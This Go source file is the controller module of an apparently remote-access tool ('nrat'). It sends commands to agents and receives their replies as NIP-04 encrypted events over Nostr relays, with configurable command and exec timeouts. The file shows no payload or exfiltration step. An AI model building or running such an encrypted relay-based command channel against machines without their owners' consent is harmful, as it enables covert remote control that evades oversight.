package control

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"time"
	"uw/uboot"
	"uw/ulog"

	"nrat/pkg/nostr"
	"nrat/pkg/nostr/nip04"

	"nrat/model"
	"nrat/utils"
)

func ControlUint(c *uboot.Context) (e error) {
	if e := c.Require(c.Context(), "unostr"); e != nil {
		return e
	}
	if e := c.Require(c.Context(), "storage"); e != nil {
		return e
	}

	storage, ok := utils.UbootGetAssert[model.Storage[*model.ControlStorageData]](c, "storage")
	if !ok {
		return errors.New("get storage failed")
	}
	unostr, ok := utils.UbootGetAssert[model.Unostr](c, "unostr")
	if !ok {
		return errors.New("get unostr failed")
	}

	control := &Control{
		unostr:  unostr,
		storage: storage,
		eventCh: make(chan *model.Event),
	}

	control.cmdTimeout, e = time.ParseDuration(storage.Storage().CmdTimeout)
	if e != nil || control.cmdTimeout < 1 {
		ulog.Warn("parse command timeout failed or timeout interval < 1, use default 10s")
		storage.Storage().CmdTimeout = "10s"
		control.cmdTimeout = 10 * time.Second

		if e := storage.Write(); e != nil {
			ulog.Warn("write storage failed: %s", e)
		}
	}

	if storage.Storage().ExecTimeout == "" {
		ulog.Warn("exec timeout is empty, use default 30s")
		storage.Storage().ExecTimeout = "30s"

		if e := storage.Write(); e != nil {
			ulog.Warn("write storage failed: %s", e)
		}
	}

	ulog.GlobalFormat().SetLevel(ulog.GlobalFormat().GetLevel() ^ ulog.LevelDebug)

	// c.Printf("control init success: %v", control)

	for {
		if e := loopHandler(control); e != nil && !errors.Is(e, ErrLoopExit) {
			ulog.Warn("loop handler failed: %s", e)
		} else if errors.Is(e, ErrLoopExit) {
			return nil
		}
	}
}

type Control struct {
	unostr     model.Unostr
	privateKey string
	publishKey string
	shareKey   []byte
	eventUnSub func()
	eventCh    chan *model.Event
	storage    model.Storage[*model.ControlStorageData]
	cmdTimeout time.Duration
}

func (control *Control) setPrivateKey(privateKey string) (e error) {
	control.privateKey = privateKey
	control.publishKey, e = nostr.GetPublicKey(privateKey)
	if e != nil {
		return fmt.Errorf("get public key failed: %w", e)
	}

	control.shareKey, e = nip04.ComputeSharedSecret(control.publishKey, privateKey)
	if e != nil {
		return fmt.Errorf("compute shared secret failed: %w", e)
	}

	return nil
}

func (control *Control) subscribe() error {
	if control.eventUnSub != nil {
		control.eventUnSub()
	}

	now := nostr.Now()
	sub, e := control.unostr.Relay().Subscribe(context.Background(), []nostr.Filter{{
		Kinds:   []int{nostr.KindApplicationSpecificData},
		Authors: []string{control.publishKey},
		Tags:    nostr.TagMap{"d": []string{"agent"}},
		Since:   &now,
	}})
	if e != nil {
		return fmt.Errorf("subscribe failed: %w", e)
	}

	control.eventUnSub = sub.Unsub
	go control.subscribeRange(sub.Events)
	return nil
}

func (control *Control) subscribeRange(ch chan *nostr.Event) {
	for ev := range ch {
		message, e := nip04.Decrypt(ev.Content, control.shareKey)
		if e != nil {
			ulog.Warn("decrypt event failed: %s", e)
			continue
		}

		evt := &model.Event{
			Id: ev.ID,
		}

		if e := evt.Decode(message); e != nil {
			ulog.Warn("decode event failed: %s", e)
			continue
		}

		evt.Content = strings.TrimSpace(evt.Content)

		select {
		case control.eventCh <- evt:
		case <-time.After(control.cmdTimeout / 2):
			ulog.Warn("event channel is full, discard event: %s", evt)
		}
	}
}

func (control *Control) publish(ctx context.Context, evt *model.Event) error {
	encMessage, e := nip04.Encrypt(evt.Encode(), control.shareKey)
	if e != nil {
		return fmt.Errorf("encrypt failed: %w", e)
	}

	ev := nostr.Event{
		PubKey:    control.publishKey,
		CreatedAt: nostr.Now(),
		Kind:      nostr.KindApplicationSpecificData,
		Tags: nostr.Tags{{
			"d", "control",
		}},
		Content: encMessage,
	}

	if e := ev.Sign(control.privateKey); e != nil {
		fmt.Printf("failed to sign: %s\n", e)
	}

	ret, e := control.unostr.Relay().Publish(ctx, ev)
	if e != nil {
		return fmt.Errorf("publish failed: %w", e)
	}

	if ret < 0 {
		return fmt.Errorf("publish failed: %s", ret)
	}

	return nil
}
